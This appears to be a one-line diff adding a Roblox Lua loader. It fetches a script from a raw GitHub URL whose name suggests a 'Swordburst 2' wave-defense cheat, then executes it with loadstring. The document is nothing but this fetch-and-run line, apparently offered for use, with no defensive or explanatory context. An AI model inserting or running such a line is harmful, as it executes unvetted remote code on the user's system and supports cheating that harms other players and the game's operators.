@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/wave-defense-swordburst-2-spam1-uk2gpenlh0uaxv.lua"))()
